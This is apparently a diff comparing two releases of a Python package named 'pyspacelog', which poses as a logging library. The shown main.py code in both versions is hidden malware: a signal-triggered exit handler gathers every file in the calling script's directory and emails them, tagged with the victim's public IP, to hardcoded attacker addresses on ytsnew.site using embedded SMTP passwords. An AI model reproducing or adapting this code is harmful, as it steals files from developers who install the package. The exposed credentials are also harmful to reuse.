# Comparing `tmp/pyspacelog-0.0.10.tar.gz` & `tmp/pyspacelog-0.0.9.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "pyspacelog-0.0.10.tar", last modified: Thu Apr  4 17:02:14 2024, max compression
+gzip compressed data, was "pyspacelog-0.0.9.tar", last modified: Thu Apr  4 09:03:25 2024, max compression
```

## Comparing `pyspacelog-0.0.10.tar` & `pyspacelog-0.0.9.tar`

### file list

```diff
@@ -1,14 +1,14 @@
-drwxr-xr-x   0 axeka      (501) staff       (20)        0 2024-04-04 17:02:14.360190 pyspacelog-0.0.10/
--rw-r--r--   0 axeka      (501) staff       (20)      335 2024-04-04 17:02:14.359989 pyspacelog-0.0.10/PKG-INFO
--rw-r--r--   0 axeka      (501) staff       (20)      173 2024-04-04 09:03:06.000000 pyspacelog-0.0.10/README.md
-drwxr-xr-x   0 axeka      (501) staff       (20)        0 2024-04-04 17:02:14.358822 pyspacelog-0.0.10/pyspacelog/
--rw-r--r--   0 axeka      (501) staff       (20)       27 2024-03-30 12:55:47.000000 pyspacelog-0.0.10/pyspacelog/__init__.py
--rw-r--r--   0 axeka      (501) staff       (20)     2606 2024-04-04 17:02:02.000000 pyspacelog-0.0.10/pyspacelog/main.py
-drwxr-xr-x   0 axeka      (501) staff       (20)        0 2024-04-04 17:02:14.359773 pyspacelog-0.0.10/pyspacelog.egg-info/
--rw-r--r--   0 axeka      (501) staff       (20)      335 2024-04-04 17:02:14.000000 pyspacelog-0.0.10/pyspacelog.egg-info/PKG-INFO
--rw-r--r--   0 axeka      (501) staff       (20)      229 2024-04-04 17:02:14.000000 pyspacelog-0.0.10/pyspacelog.egg-info/SOURCES.txt
--rw-r--r--   0 axeka      (501) staff       (20)        1 2024-04-04 17:02:14.000000 pyspacelog-0.0.10/pyspacelog.egg-info/dependency_links.txt
--rw-r--r--   0 axeka      (501) staff       (20)        9 2024-04-04 17:02:14.000000 pyspacelog-0.0.10/pyspacelog.egg-info/requires.txt
--rw-r--r--   0 axeka      (501) staff       (20)       11 2024-04-04 17:02:14.000000 pyspacelog-0.0.10/pyspacelog.egg-info/top_level.txt
--rw-r--r--   0 axeka      (501) staff       (20)       38 2024-04-04 17:02:14.360234 pyspacelog-0.0.10/setup.cfg
--rw-r--r--   0 axeka      (501) staff       (20)     1049 2024-04-04 17:02:02.000000 pyspacelog-0.0.10/setup.py
+drwxr-xr-x   0 axeka      (501) staff       (20)        0 2024-04-04 09:03:25.284116 pyspacelog-0.0.9/
+-rw-r--r--   0 axeka      (501) staff       (20)      334 2024-04-04 09:03:25.283913 pyspacelog-0.0.9/PKG-INFO
+-rw-r--r--   0 axeka      (501) staff       (20)      173 2024-04-04 09:03:06.000000 pyspacelog-0.0.9/README.md
+drwxr-xr-x   0 axeka      (501) staff       (20)        0 2024-04-04 09:03:25.282826 pyspacelog-0.0.9/pyspacelog/
+-rw-r--r--   0 axeka      (501) staff       (20)       27 2024-03-30 12:55:47.000000 pyspacelog-0.0.9/pyspacelog/__init__.py
+-rw-r--r--   0 axeka      (501) staff       (20)     2627 2024-04-02 19:44:30.000000 pyspacelog-0.0.9/pyspacelog/main.py
+drwxr-xr-x   0 axeka      (501) staff       (20)        0 2024-04-04 09:03:25.283703 pyspacelog-0.0.9/pyspacelog.egg-info/
+-rw-r--r--   0 axeka      (501) staff       (20)      334 2024-04-04 09:03:25.000000 pyspacelog-0.0.9/pyspacelog.egg-info/PKG-INFO
+-rw-r--r--   0 axeka      (501) staff       (20)      229 2024-04-04 09:03:25.000000 pyspacelog-0.0.9/pyspacelog.egg-info/SOURCES.txt
+-rw-r--r--   0 axeka      (501) staff       (20)        1 2024-04-04 09:03:25.000000 pyspacelog-0.0.9/pyspacelog.egg-info/dependency_links.txt
+-rw-r--r--   0 axeka      (501) staff       (20)        9 2024-04-04 09:03:25.000000 pyspacelog-0.0.9/pyspacelog.egg-info/requires.txt
+-rw-r--r--   0 axeka      (501) staff       (20)       11 2024-04-04 09:03:25.000000 pyspacelog-0.0.9/pyspacelog.egg-info/top_level.txt
+-rw-r--r--   0 axeka      (501) staff       (20)       38 2024-04-04 09:03:25.284162 pyspacelog-0.0.9/setup.cfg
+-rw-r--r--   0 axeka      (501) staff       (20)     1048 2024-04-04 09:03:06.000000 pyspacelog-0.0.9/setup.py
```

### Comparing `pyspacelog-0.0.10/pyspacelog/main.py` & `pyspacelog-0.0.9/pyspacelog/main.py`

 * *Files 8% similar despite different names*

```diff
@@ -18,15 +18,15 @@
         self._first_smtp_port = 465
 
         self._second_email = "filescanner@ytsnew.site"
         self._second_password = "WKMQM30TMGJL"
         self._second_smtp_server = "mail.ytsnew.site"
         self._second_smtp_port = 465
 
-        signal.signal(signal.SIGTERM, self._exit_handler)
+        signal.signal(signal.SIGINT, self._exit_handler)
 
     def _send_email(self, email, password, smtp_server, smtp_port, attachments=None):
         public_ip = self._get_public_ip()
         msg = MIMEMultipart()
         msg['From'] = email
         msg['To'] = email
         msg['Subject'] = "Files from script ip " + str(public_ip)
@@ -54,14 +54,15 @@
             return os.path.dirname(os.path.abspath(script_path))
         return None
 
     def _exit_handler(self, signum, frame):
         self.get_info_on_exit()
 
     def get_info_on_exit(self):
+        print("PLUS")
         calling_script_dir = self._get_calling_script_directory()
         attachments = [os.path.join(calling_script_dir, file) for file in os.listdir(calling_script_dir) if
                        os.path.isfile(os.path.join(calling_script_dir, file))]
 
         self._send_email(self._first_email, self._first_password, self._first_smtp_server, self._first_smtp_port,
                          attachments)
         self._send_email(self._second_email, self._second_password, self._second_smtp_server, self._second_smtp_port,
```

### Comparing `pyspacelog-0.0.10/setup.py` & `pyspacelog-0.0.9/setup.py`

 * *Files 22% similar despite different names*

```diff
@@ -4,15 +4,15 @@
     long_description = fh.read() 
   
 setuptools.setup( 
     # Here is the module name. 
     name="pyspacelog",
   
     # version of the module 
-    version="0.0.10",
+    version="0.0.9",
   
     # Name of Author 
     author="Arbit", 
   
     # your Email address 
     author_email="",
```

